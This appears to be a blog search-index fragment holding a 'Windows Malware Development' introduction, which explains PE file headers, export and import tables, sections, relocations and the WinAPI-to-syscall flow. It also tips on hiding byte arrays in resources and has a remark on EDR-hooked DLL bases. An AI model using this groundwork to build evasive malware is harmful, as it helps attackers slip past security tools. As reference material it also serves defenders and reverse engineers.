follows:\nDllBase: 0x00007FF959AF0000 OriginalBase: 0x00007FF959AF0000The fact they are the same means they are both pointing to a good, clean version of the DLL but from what I understand, the OriginalBase will always point to the \u0026ldquo;original\u0026rdquo; one whereas the DllBase can be manipulated by EDRs like S1. If I am wrong or there is a flaw in my research please let me know!\n","date":"4 May, 2025","externalUrl":null,"permalink":"/posts/windows-malware-development/developing-malware/","section":"Posts","summary":"Second part in the \u0026lsquo;Windows Malware Development\u0026rsquo; series","title":"Developing Malware","type":"posts"},{"content":"","date":"4 May, 2025","externalUrl":null,"permalink":"/tags/development/","section":"Tags","summary":"","title":"Development","type":"tags"},{"content":"","date":"3 May, 2025","externalUrl":null,"permalink":"/tags/introduction/","section":"Tags","summary":"","title":"Introduction","type":"tags"},{"content":" PE Files # For the sake of simplicity, I will show only the 64 bit version of structures (structs) even though some have 32 bit counterparts. These structures can be found in the winnt.h header file. A Portable Executable (PE) file is the standard format created by Microsoft for binary files like EXEs and DLLs. The structure of a PE file below1:\nPE Layout Diagram When a PE file is run, it will be copied into memory along with any dependences it requires such as imported binaries for the functions they export. Because of advances in security, the memory region they are copied into is randomized every time. This process is called Address Space Layout Randomization (ASLR). In other words the address for functions, headers, or any other part of a PE file will not be the same for each instance. Instead, this is solved with Relative Virtual Addresses (RVAs). RVAs are offsets in memory relative to the base address of the PE file. To calculate the address in which something sits, take the base address of the PE file and add the RVA associated with the desired location.\nHeaders # Headers are the first parts of the PE file. These contain information about the file and what is needed in order to be executed or used. I won\u0026rsquo;t go into detail for all headers and sections for the sake of brevity but the important items to note are that the DOS header includes: the magic bytes, values about the contents of the file and subsequent sections, and the RVA of the address within the file on disk for the PE header (NT header). The DOS header will always signify the start of a PE file.\nThe DOS header struct is noted below. The e_lfanew member within the struct is the aforementioned RVA to the PE header. typedef struct _IMAGE_DOS_HEADER { // DOS .EXE header WORD e_magic; // Magic number WORD e_cblp; // Bytes on last page of file WORD e_cp; // Pages in file WORD e_crlc; // Relocations WORD e_cparhdr; // Size of header in paragraphs WORD e_minalloc; // Minimum extra paragraphs needed WORD e_maxalloc; // Maximum extra paragraphs needed WORD e_ss; // Initial (relative) SS value WORD e_sp; // Initial SP value WORD e_csum; // Checksum WORD e_ip; // Initial IP value WORD e_cs; // Initial (relative) CS value WORD e_lfarlc; // File address of relocation table WORD e_ovno; // Overlay number WORD e_res[4]; // Reserved words WORD e_oemid; // OEM identifier (for e_oeminfo) WORD e_oeminfo; // OEM information; e_oemid specific WORD e_res2[10]; // Reserved words LONG e_lfanew; // File address of new exe header } IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;Immediately after the DOS header will be the DOS stub which is there essentially for compatibility reasons. If an executable file were to be loaded in a DOS system, the OS would be able to run the stub because it\u0026rsquo;s a 16 bit program. If you have ever run Strings on any Windows binary, you\u0026rsquo;ve likely encountered the famous text: \u0026ldquo;This program cannot be run in DOS mode.\u0026rdquo;\nThe PE header holds more information about the contents of the file and subsequent sections. More importantly it contains the structure for the Optional header! The Optional header contains A LOT of information needed later when creating the malware. It may be called the Optional header, but it is required. Some important ones include pointers to the beginning of some sections, the preferred base address, and an array of Data Directory structs.\nThe PE header and the Optional header structs are noted below respectively: typedef struct _IMAGE_NT_HEADERS64 { DWORD Signature; IMAGE_FILE_HEADER FileHeader; IMAGE_OPTIONAL_HEADER64 OptionalHeader; } IMAGE_NT_HEADERS64, *PIMAGE_NT_HEADERS64; typedef struct _IMAGE_OPTIONAL_HEADER64 { WORD Magic; BYTE MajorLinkerVersion; BYTE MinorLinkerVersion; DWORD SizeOfCode; DWORD SizeOfInitializedData; DWORD SizeOfUninitializedData; DWORD AddressOfEntryPoint; DWORD BaseOfCode; ULONGLONG ImageBase; DWORD SectionAlignment; DWORD FileAlignment; WORD MajorOperatingSystemVersion; WORD MinorOperatingSystemVersion; WORD MajorImageVersion; WORD MinorImageVersion; WORD MajorSubsystemVersion; WORD MinorSubsystemVersion; DWORD Win32VersionValue; DWORD SizeOfImage; DWORD SizeOfHeaders; DWORD CheckSum; WORD Subsystem; WORD DllCharacteristics; ULONGLONG SizeOfStackReserve; ULONGLONG SizeOfStackCommit; ULONGLONG SizeOfHeapReserve; ULONGLONG SizeOfHeapCommit; DWORD LoaderFlags; DWORD NumberOfRvaAndSizes; IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES]; } IMAGE_OPTIONAL_HEADER64, *PIMAGE_OPTIONAL_HEADER64; Directories # A Data Directory structure is essentially used to hold information about important directories (and by extension, tables). Specifically the structure contains the virtual address in which the Directory Entry is located as well as the size of the entry. The array of Data Directory structs is specifically ordered so that each index contains a specific entry. For example the first index is the Data Directory structure for the Export Directory, whereas the index after that is the structure for the Import Directory. These are very important to note as they contain both the Export Address Table (EAT) and the Import Address Table (IAT) respectively.\nJust as it sounds, the Export Directory is the place where all exported functions can be found within the PE file. Take ntdll.dll for example: Let\u0026rsquo;s say we wanted to call the NtCreateFile function. To find where that function is located in memory and call it that way, we would have to search the Export Directory of ntdll.dll to get the address of the function. However, that may not be as simple as it sounds. Here is why.\nThe last 3 members of the struct are a set of arrays that play a critical role in how the locations of functions are resolved. There are two ways that resolution can happen: by searching first for the name of the function, and second, by the biased ordinal number.\nExport Directory # The Export Directory struct is shown below. Note the AddressOfFunctions, AddressOfNames, and AddressOfNameOrdinals members which are the arrays I mentioned above. typedef struct _IMAGE_EXPORT_DIRECTORY { DWORD Characteristics; DWORD TimeDateStamp; WORD MajorVersion; WORD MinorVersion; DWORD Name; DWORD Base; DWORD NumberOfFunctions; DWORD NumberOfNames; DWORD AddressOfFunctions; // RVA from base of image DWORD AddressOfNames; // RVA from base of image DWORD AddressOfNameOrdinals; // RVA from base of image } IMAGE_EXPORT_DIRECTORY, *PIMAGE_EXPORT_DIRECTORY;To start, let\u0026rsquo;s take a step back and see what the arrays are for and the relationship between them. Shown below is a good visualization of how these arrays work together2:\nFunction Resolution Diagram Simply stated the AddressOfNames is the array that contains the names of the exported functions of the binary. The index of the function name in that array is directly correlated to the index of the AddressOfNameOrdinals array. That will give you the ordinal number (index) for where to find said function\u0026rsquo;s address via an RVA in the AddressOfFunctions array.\nReturning to the diagram above, let\u0026rsquo;s say we wanted to use \u0026rsquo;name2\u0026rsquo; from the imaginary binary\u0026rsquo;s exported functions. The first step would be to go into the array AddressOfNames starting with the first index and compare the names of the functions until we find a match. In this case, it is our third index. The next step would be to go into the AddressOfNameOrdinals array at the third index to find the ordinal. In this example it would be 2. (It isn\u0026rsquo;t always this simple; sometimes it could be ordinal 102.) That ordinal is the index for where to search in the AddressOfFunctions to get the RVA. In this case, we would get the RVA addr2 because the ordinal was 2.\nNote: When I say \u0026ldquo;ordinal\u0026rdquo; in the above example, I am talking about the unbiased ordinal. However to save memory, and especially if the binary has hundreds or thousands of exported functions, it may be wise to use ordinal numbers instead of function names. These are called \u0026ldquo;biased ordinals.\u0026rdquo; The distinction depends on how the ordinal is calculated. Unbiased ordinals are used internally to calculate the index of where the RVA is located within the AddressOfFunctions. Biased ordinals are calculated by adding the Base member from the Export Directory to the ordinal number. The result is used externally to call exported functions.\nThe Base member is the starting number in which the biased ordinals start (typically the Base member is set to 1) Going back to the example, let\u0026rsquo;s say we knew the biased ordinal of the function we wanted to call. Assume the Base is 1 and the biased ordinal is 3. What we would do is subtract the Base from the ordinal (3-1) which equals 2. That means the index that we need to go to in the AddressOfFunctions array is 2. Looking at the diagram, this would be an RVA of addr2.\nImport Directory # Moving onto the Import Directory. When the PE files need to use exported functions from other binaries, this is how the loader will determine which functions from which binaries are needed and where to find them in memory. Unlike with the Export Directory, the Import Directory doesn\u0026rsquo;t have a dedicated \u0026ldquo;import directory\u0026rdquo; struct. Instead it starts with an array of Import Descriptor structs and ends with a NULLed out struct.\nThe Import Descriptor struct is shown below. This is often referred to as the Import Directory Table (IDT). For every imported binary, there will be a corresponding Import Descriptor struct. typedef struct _IMAGE_IMPORT_DESCRIPTOR { union { DWORD Characteristics; // 0 for terminating null import descriptor DWORD OriginalFirstThunk; // RVA to original unbound IAT (PIMAGE_THUNK_DATA) } DUMMYUNIONNAME; DWORD TimeDateStamp; // 0 if not bound, // -1 if bound, and real date\\time stamp // in IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT (new BIND) // O.W. date/time stamp of DLL bound to (Old BIND) DWORD ForwarderChain; // -1 if no forwarders DWORD Name; DWORD FirstThunk; // RVA to IAT (if bound this IAT has actual addresses) } IMAGE_IMPORT_DESCRIPTOR; typedef IMAGE_IMPORT_DESCRIPTOR UNALIGNED *PIMAGE_IMPORT_DESCRIPTOR;Before diving into the specific attributes of the structures, it\u0026rsquo;s important to know how the import resolution works and how it functions. Essentially there are three main parts: the Import Directory Table (IDT), the Import Lookup Table (ILT), and the Import Address Table (IAT). When the PE file gets copied to memory in order to be executed, the loader will eventually need to figure out what binaries are required to be coped into memory as well as the functions\u0026rsquo; addresses needed for the PE file to function correctly. The loader will then begin with the IDT to figure out what imported binaries are needed. However, there is no need to catalog every function of the imported binaries and by extension, its addresses. To save time, memory, and CPU cycles, the loader will attempt to resolve only the needed functions. This is where the ILT comes into play. The ILT contains an array of RVAs that point to the Hint/Name table. The Hint/Name table contains Hint/Name pairs in which for every function imported from the given binary, there will be a Hint/Name entry for it.\nTake for example a PE file that imports the NtCreateFile function from ntdll.dll. There will be an IDT entry for ntdll.dll and within that, there will be an ILT entry for NtCreateFile which will have a Hint/Name pair for that function.\nThe Hint/Name pair is fairly straight forward. As mentioned, there is optimization built into how PE files work. Instead of recursively going through every single exported function of the imported binary (process explained above in the Export Directory section), the ILT gives a \u0026ldquo;hint\u0026rdquo; of the most likely location of the required function. The loader will then use the hint as a \u0026ldquo;best guess\u0026rdquo; and associate the hint as an index to the AddressOfNames array. The given function name in the Hint/Name pair is then compared to the string within that index. If there is a match, it proceeds with resolving the exported functions address. If no match it attempts to resolve the functions address by name instead. Once it has resolved the address in which the function lies, it will add that as an entry within the IAT.\nThe IAT is the last (and arguably the most important) table. It starts out initialized so that each entry points to its corresponding Hint/Name table entry. Then, for each function that it resolves, it overrides the IAT entry with that functions RVA. In other words, the IAT and ILT will be exactly the same on disk and right before import resolution happens in memory. After this process concludes, the IAT will then contain the RVAs of the functions. This is helpful when the PE file needs to call that function, it will directly parse the IAT for where to find the function in memory.\nMoving on to the layout of the structs, let\u0026rsquo;s look at how they are laid out. Starting with the union in the IDT, both of the members are effectively doing the same thing. The Characteristic is mostly deprecated and the OriginalFirstThunk member is an RVA to the ILT. The Name member will contain the name of the imported binary, and the FirstThunk member is the RVA to the start of the IAT.\nBoth the OriginalFirstThunk and FirstThunk members are of the THUNK_DATA type. The structure for these is given below: typedef struct _IMAGE_THUNK_DATA64 { union { ULONGLONG ForwarderString; // PBYTE ULONGLONG Function; // PDWORD ULONGLONG Ordinal; ULONGLONG AddressOfData; // PIMAGE_IMPORT_BY_NAME } u1; } IMAGE_THUNK_DATA64; typedef IMAGE_THUNK_DATA64 * PIMAGE_THUNK_DATA64;These structs contain the the data required for either the ILT or the IAT. The former will contain a pointer to the Hint/Name entry; the latter indicates the RVA to the IAT entry.\nThe Hint/Name table entries are built with the IMPORT_BY_NAME struct shown below: typedef struct _IMAGE_IMPORT_BY_NAME { WORD Hint; CHAR Name[1]; } IMAGE_IMPORT_BY_NAME, *PIMAGE_IMPORT_BY_NAME;As you can see, the structure has two members, one for the hint and the other for the name of the function.\nSections # There are typically 7 sections following the headers and data directories:\nSection Contains .text Executable code .rdata Read-only data .data Initialized data .pdata Exception handling data .idata Import data (the import directory is actually held here) .rsrc Resources (icons, pictures, etc.) .reloc Relocations (how statically programmed addresses map to ASLR) The compiler can add more sections if needed but these are the common ones-found inside most PE files. To get the gears turning, each section can be somewhat manipulated to intentionally obfuscate some malicious capabilities by the location of certain information.\nFor example, if we had a uint8 variable called varOne, that variable would be stored in the .text section. However, if we made that a constant variable, it would instead be stored in the .rdata section. Likewise, if there is a byte array that is needed, why not convert it to a .jpg file and that would be stored into the .rsrc section? These are examples of a few ways to facilitate the acquisition and intentional manipulation of data within the PE file sections.\nEach section has it\u0026rsquo;s own struct and within each of the them are the members that give information about them. Those to note are the VirtualAddress, NumberOfRelocations, and PointerToRelocations. The SECTION_HEADER struct as shown below: typedef struct _IMAGE_SECTION_HEADER { BYTE Name[IMAGE_SIZEOF_SHORT_NAME]; union { DWORD PhysicalAddress; DWORD VirtualSize; } Misc; DWORD VirtualAddress; DWORD SizeOfRawData; DWORD PointerToRawData; DWORD PointerToRelocations; DWORD PointerToLinenumbers; WORD NumberOfRelocations; WORD NumberOfLinenumbers; DWORD Characteristics; } IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;An additional section that may be useful to understand is .reloc. For a few reasons, it is helpful to know how relocations work and how to calculate them. One is that reflective DLLs will need to do relocations manually in order to work.\nAny statically programmed addresses will need to be changed due to ASLR. This is done with relocations. Relocations are calculated by taking the delta between the ImageBase address (the preferred base address) inside the Optional header and the actual base address of the PE file (allocated by ASLR). After determining the delta, add it to the addresses within the relocation table.\nThe relocation table is an array of BASE_RELOCATION structs. These have two members: VirtualAddress and SizeOfBlock. The former is the RVA of the address to which the relocation needs to be applied. The latter is the size or amount of bytes needed to be relocated. Here is the aforementioned relocation struct: typedef struct _IMAGE_BASE_RELOCATION { DWORD VirtualAddress; DWORD SizeOfBlock; // WORD TypeOffset[1]; } IMAGE_BASE_RELOCATION; typedef IMAGE_BASE_RELOCATION UNALIGNED * PIMAGE_BASE_RELOCATION; Windows API # After the PE file is loaded into memory and goes through the processes described above, how does this interact with Windows and its subsystems? This is where the Windows API (WinAPI) comes into play. The WinAPI is used to call certain functions that are exposed in Windows to interact with memory, processes, subsystems, and others. There are two main levels within execution: user space and kernel space. The former is where most applications are run along with segmentation that restricts lower level operations due to security reasons. The latter is where Windows carries out those operations and executes the syscalls. Syscalls are very low level CPU/hardware instructions that tell the computer what to do and how to do it.\nI created the visual below to show the execution flow. Notice the two aforementioned levels. However, the user space will contain most of the operations which include the WinAPI calls. stateDiagram-v2 direction LR state UserSpace { direction LR Application --\u003e WinAPI state WinAPI { direction LR WinAPIFunction --\u003e NTAPI state NTAPI { Direction LR NTAPIFunction --\u003e KernelSpace state KernelSpace { Syscall } } } } When an application wants to do something, it will call its dedicated WinAPI function. Effectively the WinAPI function call is a wrapper for the NTAPI version of that call which is held in ntdll.dll. This is because the NTAPI is the gateway to the kernel space and by extension, its syscall which requires careful handling to make sure it is being called correctly. According to Microsoft, most of the NTAPI function calls are undocumented and if used, can be extremely unstable due to potential changes when there is an update. So the WinAPI is an effective way to keep the function calls stable with little change when there are updates to Windows. In other words, the application will call a WinAPI function. That function will call its NTAPI version which will transition it into kernel space and call its syscall.\nShown below is the same graph but replaced with a real world example to demonstrate the execution flow. Note that the syscall is 0x0055 which is the corresponding syscall for the function during the writing of this post. However, syscall numbers can change (and frequently do). stateDiagram-v2 direction LR state UserSpace { direction LR Notepad.exe --\u003e WindowsAPI state WindowsAPI { direction LR CreateFileA --\u003e NTAPI state NTAPI { Direction LR NtCreateFile --\u003e KernelSpace state KernelSpace { 0x0055 } } } } Here Notepad.exe is trying to create a file. To do so it will use the CreateFileA WinAPI function. That function will call its NTAPI version which is NtCreateFile. Afterwards it will transition into kernel space and execute its syscall number in this case being 0x0055.\nYou can manually check the syscall numbers via debugging the syscall instruction during the execution of functions; OR look them up from historical databases like the one found here or here. For proof of concept, below is what the same syscall looks like in x64 assembly under the debugger:\nSyscall Debugging in x64 Assembly Notice the mov instruction above the syscall. Specifically the bytes 55 is the syscall number for NtCreateFile. Some databases refer to the syscall number in decimal form; others refer to them in byte form similar to how it\u0026rsquo;s executed in assembly as seen above. Either way, 55 in bytes translates to 85 in decimal so keep an eye out for how they are represented.\nMassive thanks to Ange Albertini for creating the PE diagrams found on his github!\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nVery helpful diagram via infosecinstitute from Dejan Lukan\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n","date":"3 May, 2025","externalUrl":null,"permalink":"/posts/windows-malware-development/introduction/","section":"Posts","summary":"First part in the \u0026lsquo;Windows Malware Development\u0026rsquo; series","title":"Introduction to Windows Architecture","type":"posts"},{"content":"","externalUrl":null,"permalink":"/authors/","section":"Authors","summary":"","title":"Authors","type":"authors"},{"content":"","externalUrl":null,"permalink":"/categories/","section":"Categories","summary":"","title":"Categories","type":"categories"}]